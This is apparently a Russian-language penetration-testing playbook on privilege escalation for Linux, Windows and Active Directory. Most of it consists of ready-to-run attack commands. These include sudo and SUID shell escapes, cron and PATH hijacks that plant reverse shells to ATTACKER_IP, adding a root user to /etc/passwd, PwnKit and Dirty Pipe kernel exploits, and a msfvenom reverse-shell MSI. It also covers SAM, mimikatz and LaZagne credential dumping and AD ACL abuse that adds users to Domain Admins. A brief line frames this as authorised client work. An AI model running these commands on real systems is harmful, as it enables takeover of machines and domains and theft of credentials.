#privesc #pentest #corporate #linux #windows

> Фаза повышения привилегий — эскалация доступа от низкопривилегированного пользователя до root/SYSTEM или Domain Admin путём эксплуатации мисконфигураций, уязвимостей ОС и слабостей сервисов.

## Цель фазы

После получения первоначального доступа атакующий, как правило, работает под непривилегированной учётной записью. Задача этой фазы — повысить привилегии до максимального уровня: **root** на Linux, **SYSTEM** или **Domain Admin** на Windows/AD. Без этого большинство дальнейших действий (дамп учётных данных, закрепление, lateral movement) существенно ограничены.

---

## LINUX PRIVESC

### 1. Автоматическая разведка

Первый шаг — запустить автоматизированный сбор информации. Инструменты обнаруживают сотни потенциальных векторов значительно быстрее ручного анализа.

#### LinPEAS

Наиболее мощный инструмент для разведки на Linux. Проверяет sudo, SUID/SGID, cron, writable files, kernel version, capabilities, и многое другое.

```bash
# Скачать и запустить напрямую (если есть интернет)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Или передать через атакующую машину
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_out.txt
```

**Цветовая кодировка вывода:**
- 🔴 Красный/жёлтый фон — критические находки, высокая вероятность эскалации
- 🟡 Жёлтый — интересные конфигурации, требуют ручной проверки
- 🔵 Синий — информационные данные

**На что смотреть в первую очередь:** секция `Sudo version`, `SUID binaries`, `Interesting writable files`, `Cron jobs`, `Active Ports`.

#### LinEnum

Альтернатива LinPEAS, менее детальная, но иногда удобнее для быстрого обзора.

```bash
wget http://ATTACKER_IP/LinEnum.sh -O /tmp/linenum.sh
chmod +x /tmp/linenum.sh
/tmp/linenum.sh -t 2>/dev/null
```

#### linux-exploit-suggester

Специализирован на поиске kernel exploits под конкретную версию ядра.

```bash
wget http://ATTACKER_IP/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh
# или
uname -r  # получить версию ядра вручную
```

---

### 2. sudo Мисконфигурации

Один из наиболее распространённых и надёжных векторов на реальных системах.

```bash
# Просмотр разрешённых sudo-команд для текущего пользователя
sudo -l
```

Типичный уязвимый вывод:
```
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/find
(ALL) NOPASSWD: /usr/bin/python3
```

**GTFOBins** — база данных способов эскалации через конкретные бинари: [gtfobins.github.io](https://gtfobins.github.io)

#### Примеры эскалации через sudo

```bash
# vim
sudo vim -c ':!/bin/sh'

# find
sudo find . -exec /bin/sh \; -quit

# python
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# tar (через checkpoint)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

### 3. SUID / SGID Binaries

Бинари с установленным битом SUID выполняются с привилегиями владельца (обычно root). Если среди них есть небезопасные программы — эскалация тривиальна.

```bash
# Найти все SUID-бинари в системе
find / -perm -4000 -type f 2>/dev/null

# Найти все SGID-бинари
find / -perm -2000 -type f 2>/dev/null

# Объединённый поиск SUID и SGID
find / -perm /6000 -type f 2>/dev/null
```

Полученный список сверять с разделом **SUID** на GTFOBins. Особое внимание на: `bash`, `cp`, `mv`, `nmap`, `vim`, `python`, `perl`, `php`, `env`, `tee`, `less`, `more`, `man`.

```bash
# Пример: SUID на bash (нестандартный, но встречается)
/bin/bash -p  # -p сохраняет EUID

# Пример: SUID на find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Эксплуатация кастомного SUID-бинаря с уязвимостью PATH
# Если бинарь вызывает system("cat file") без полного пути:
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
./vulnerable_suid_binary
```

---

### 4. Cron Jobs

Задачи планировщика, выполняемые от root, — классический вектор если скрипт доступен на запись текущему пользователю.

```bash
# Просмотр системных cron-задач
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/root 2>/dev/null

# Поиск всех cron-файлов
find /etc/cron* /var/spool/cron -type f 2>/dev/null

# Мониторинг запускаемых процессов (полезно для обнаружения скрытых cron)
watch -n 1 "ps aux --sort=-%cpu | head -20"
# или использовать pspy:
./pspy64 -pf -i 1000
```

#### Атака: замена writable-скрипта

```bash
# Находим скрипт, который вызывается root cron и доступен на запись
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ...

# Заменяем содержимое на reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /opt/scripts/backup.sh
```

#### Атака: PATH hijacking в cron

Если в `/etc/crontab` переменная PATH включает директории, доступные на запись:

```bash
# /etc/crontab содержит: PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin

# Создаём поддельный бинарь в /home/user
echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/systemcheck
chmod +x /home/user/systemcheck
```

---

### 5. Writable Files и слабые права доступа

#### /etc/passwd доступен на запись

```bash
# Проверить права
ls -la /etc/passwd

# Сгенерировать хэш пароля
openssl passwd -1 -salt xyz hacked123
# Вывод: $1$xyz$...

# Добавить нового root-пользователя
echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Войти
su hacker
```

#### /etc/sudoers доступен на запись

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo /bin/bash
```

#### Поиск writable-директорий в PATH

```bash
# Проверить каждую директорию из PATH
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null | grep -v "^d..x..x..x"

# Найти все writable директории
find / -writable -type d 2>/dev/null | grep -v proc
```

---

### 6. Kernel Exploits

Самый мощный, но и самый опасный вектор. Некорректно применённый эксплойт ядра может привести к kernel panic и перезагрузке системы.

```bash
# Получить версию ядра
uname -r
uname -a
cat /proc/version
```

```bash
# Поиск эксплойтов через searchsploit
searchsploit linux kernel $(uname -r | cut -d- -f1)
searchsploit linux privilege escalation kernel
```

**Известные эксплойты:**

| CVE | Название | Версии ядра |
|-----|----------|------------|
| CVE-2016-5195 | DirtyCow | < 4.8.3 |
| CVE-2021-4034 | PwnKit (pkexec) | все дистрибутивы до Jan 2022 |
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 |
| CVE-2017-16995 | eBPF | 4.4 – 4.14 |

```bash
# PwnKit (CVE-2021-4034) — наиболее надёжный, не ронят систему
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034

# Dirty Pipe (CVE-2022-0847)
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 "root::0:0:root:/root:/bin/bash"
su root
```

> **Предупреждение:** DirtyCow и аналоги нестабильны на production-системах. PwnKit значительно безопаснее. Всегда предупреждать заказчика перед применением kernel exploits.

---

### 7. Сервисы, запущенные от root

Если сервис запущен от root, а его конфиг или бинарь доступны на запись — возможна эскалация.

```bash
# Найти процессы от root
ps aux | grep root | grep -v grep

# Проверить сокеты и порты, слушающие только на localhost
ss -tlnp
netstat -tlnp 2>/dev/null

# Проверить права конфиг-файлов найденных сервисов
ls -la /etc/nginx/nginx.conf
ls -la /etc/mysql/my.cnf
```

#### PATH injection в service-скрипте

```bash
# Если init-скрипт использует относительные пути:
cat /etc/init.d/vulnerable-service | grep -v '#' | grep exec

# Добавить /tmp в начало PATH и создать поддельный бинарь
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/curl
chmod +x /tmp/curl
```

---

## WINDOWS PRIVESC

### 8. Автоматическая разведка

#### WinPEAS

Аналог LinPEAS для Windows. Охватывает сервисы, реестр, credentials, scheduled tasks, UAC, и сотни других проверок.

```powershell
# Скачать и запустить (если разрешено ExecutionPolicy)
iwr http://ATTACKER_IP/winPEASx64.exe -OutFile C:\Temp\winpeas.exe
C:\Temp\winpeas.exe

# Запустить все проверки и сохранить вывод
C:\Temp\winpeas.exe > C:\Temp\winpeas_out.txt

# Если цвета не отображаются в cmd
C:\Temp\winpeas.exe cmd
```

Цвет в выводе аналогичен Linux-версии: красный/жёлтый = высокий приоритет.

#### PowerUp

Специализирован на поиске service misconfigurations и слабостей конфигурации.

```powershell
# Загрузить в память и запустить (bypass AMSI может потребоваться)
iex (iwr http://ATTACKER_IP/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks

# Или загрузить файл
Import-Module C:\Temp\PowerUp.ps1
Invoke-AllChecks | Out-File C:\Temp\powerup_out.txt
```

#### Seatbelt

Аудит конфигурации безопасности: Token Privileges, Credential Guard, AppLocker, WSL, и многое другое.

```powershell
C:\Temp\Seatbelt.exe -group=all
C:\Temp\Seatbelt.exe TokenPrivileges CredentialGuard AMSIProviders
```

---

### 9. Service Misconfigurations

#### Unquoted Service Paths

Если путь к бинарю сервиса содержит пробелы и не заключён в кавычки, Windows перебирает варианты пути.

```cmd
# Поиск сервисов с незакавыченными путями
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
sc query type= all state= all

# PowerShell-вариант
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'}
```

Если путь `C:\Program Files\My App\service.exe` — создаём `C:\Program.exe` и при перезапуске сервиса он запустится как SYSTEM.

```cmd
# Поместить payload в нужную позицию
copy C:\Temp\shell.exe "C:\Program Files\My.exe"
sc stop VulnService
sc start VulnService
```

#### Weak Service Permissions

```powershell
# PowerUp находит это автоматически через Invoke-AllChecks
# Ручная проверка через accesschk (Sysinternals):
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %username% * /accepteula

# Если можно изменить бинарный путь сервиса:
sc config VulnService binpath= "C:\Temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### Writable Service Binary

```powershell
# Найти сервисы с бинарями, доступными на запись
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"','' -split ' ' | Select-Object -First 1
    if (Test-Path $path) {
        $acl = Get-Acl $path
        if ($acl.AccessToString -match "Everyone|BUILTIN\\Users.*Allow.*Write|Modify") {
            Write-Host "WRITABLE: $($_.Name) -> $path"
        }
    }
}

# Заменить бинарь на payload
copy C:\Temp\shell.exe "C:\Path\To\vulnerable_service.exe"
```

---

### 10. Token Impersonation

Если у процесса есть привилегия `SeImpersonatePrivilege` или `SeAssignPrimaryTokenPrivilege` (часто присутствует у IIS, SQL Server, сервисных учёток), можно имперсонировать SYSTEM.

```cmd
# Проверить текущие привилегии
whoami /priv
```

#### PrintSpoofer (Windows 10 / Server 2019+)

```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\Temp\shell.exe"
```

#### GodPotato (универсальный, Windows Server 2012–2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c C:\Temp\shell.exe"
```

#### JuicyPotato (legacy, до Windows 10 1809 / Server 2019)

```cmd
# Требует CLSID под конкретную версию ОС
JuicyPotato.exe -l 1337 -p C:\Temp\shell.exe -t * -c {CLSID}
# CLSID: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

---

### 11. Registry & Scheduled Tasks

#### AlwaysInstallElevated

Если оба ключа реестра установлены в 1 — любой MSI-пакет устанавливается с правами SYSTEM.

```cmd
# Проверить ключи
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# Создать вредоносный MSI через msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Установить на жертве
msiexec /quiet /qn /i C:\Temp\shell.msi
```

#### Autoruns: Writable Scheduled Tasks

```powershell
# Просмотр scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# Проверить права на исполняемый файл задачи
Get-ScheduledTask | ForEach-Object {
    $action = $_.Actions | Select-Object -First 1
    if ($action.Execute) { icacls $action.Execute 2>$null }
}
```

#### Startup Programs

```cmd
# Проверить writable startup-локации
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
icacls "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

# Разместить payload
copy C:\Temp\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

---

### 12. Credential Hunting (Windows)

#### SAM / SYSTEM Dump

```cmd
# Через shadow copy (если есть права администратора локально)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Извлечь хэши на атакующей машине
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

#### mimikatz

```cmd
# Дамп учётных данных из памяти LSASS
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Дамп всех доступных секретов
lsadump::sam
lsadump::secrets
lsadump::cache
```

#### LaZagne

Автоматический поиск сохранённых паролей в браузерах, почтовых клиентах, SSH, Git и других приложениях.

```cmd
LaZagne.exe all
LaZagne.exe browsers
LaZagne.exe windows
```

#### Registry Credentials

```cmd
# Сохранённые подключения (Windows Credential Manager)
cmdkey /list

# Поиск паролей в реестре
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC пароли
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
```

---

### 13. Active Directory PrivEsc Paths

Для поиска путей эскалации в AD использовать BloodHound (собранные данные из [[06 — Lateral Movement]]).

#### ACL Abuse

Если текущий пользователь имеет одно из следующих разрешений на объект AD:

| Право | Что даёт | Атака |
|-------|----------|-------|
| `GenericAll` | Полный контроль | Сменить пароль, добавить в группу |
| `GenericWrite` | Запись атрибутов | Kerberoasting через SPN, shadow credentials |
| `WriteDACL` | Изменение ACL | Добавить себе `GenericAll` |
| `WriteOwner` | Смена владельца | Стать владельцем, затем добавить `GenericAll` |

```powershell
# Изменить пароль пользователя (если есть GenericAll/GenericWrite)
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Добавить себя в группу Domain Admins (если GenericAll на группу)
Add-DomainGroupMember -Identity "Domain Admins" -Members current_user
```

#### Kerberos Delegation

```powershell
# Поиск хостов с Unconstrained Delegation (кроме DC)
Get-DomainComputer -Unconstrained | Select-Object DnsHostName

# Поиск аккаунтов с Constrained Delegation
Get-DomainUser -TrustedToAuth | Select-Object SamAccountName, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object DnsHostName, msds-allowedtodelegateto
```

**Unconstrained Delegation:** при подключении администратора к этому хосту его TGT сохраняется в памяти — можно извлечь через mimikatz и использовать для pass-the-ticket.

**Constrained Delegation с `TrustedToAuthForDelegation` (Protocol Transition):** можно запросить service ticket от имени любого пользователя, включая Domain Admin.

#### AdminSDHolder Abuse

Если есть `WriteDACL` или `GenericAll` на контейнер AdminSDHolder — можно добавить пользователя с `GenericAll` на все protected objects (Domain Admins, Administrators и др.). SDProp применит изменения в течение ~60 минут.

```powershell
# Добавить текущего пользователя в ACL AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity current_user -Rights All
```

---

## Таблица инструментов

| Инструмент | Платформа | Назначение | Рейтинг | Ссылка/установка |
|------------|-----------|-----------|---------|-----------------|
| LinPEAS | Linux | Автоматическая разведка | ⭐⭐⭐⭐⭐ | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| WinPEAS | Windows | Автоматическая разведка | ⭐⭐⭐⭐⭐ | [PEASS-ng releases](https://github.com/carlospolop/PEASS-ng/releases) |
| PowerUp | Windows | Service misconfigurations | ⭐⭐⭐⭐⭐ | [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
| mimikatz | Windows | Дамп учётных данных | ⭐⭐⭐⭐⭐ | [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) |
| PrintSpoofer | Windows | Token Impersonation | ⭐⭐⭐⭐⭐ | [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |
| GodPotato | Windows | Token Impersonation | ⭐⭐⭐⭐⭐ | [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) |
| JuicyPotato | Windows | Token Impersonation (legacy) | ⭐⭐⭐⭐ | [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato) |
| LaZagne | Windows | Credential hunting | ⭐⭐⭐⭐⭐ | [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) |
| Seatbelt | Windows | Security config audit | ⭐⭐⭐⭐ | [GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt) |
| linux-exploit-suggester | Linux | Поиск kernel CVEs | ⭐⭐⭐⭐ | [mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) |
| pspy | Linux | Мониторинг процессов/cron | ⭐⭐⭐⭐ | [DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) |

---

## Справочные ресурсы

| Ресурс | Описание | Рейтинг |
|--------|----------|---------|
| [gtfobins.github.io](https://gtfobins.github.io) | Эскалация через Unix-бинари (sudo, SUID, cron) | ⭐⭐⭐⭐⭐ |
| [lolbas-project.github.io](https://lolbas-project.github.io) | Living Off The Land Binaries для Windows | ⭐⭐⭐⭐⭐ |
| [book.hacktricks.xyz](https://book.hacktricks.xyz) | Обширная wiki по всем техникам privesc | ⭐⭐⭐⭐⭐ |
| [exploit-db.com](https://exploit-db.com) | База публичных эксплойтов | ⭐⭐⭐⭐ |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Коллекция payload'ов и техник | ⭐⭐⭐⭐⭐ |

---

→ [[08 — Persistence]]
